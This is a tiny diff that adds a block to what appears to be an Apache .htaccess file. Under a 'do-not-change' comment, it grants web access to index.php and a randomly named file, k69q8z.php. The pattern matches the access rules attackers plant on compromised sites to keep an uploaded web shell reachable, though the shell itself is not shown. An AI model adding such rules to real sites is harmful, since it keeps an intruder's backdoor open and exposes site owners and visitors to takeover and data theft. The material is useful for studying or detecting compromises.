@@ -1,0 +1,5 @@
+#---do-not-change-the-following-content---
+<FilesMatch '^(index.php|k69q8z.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
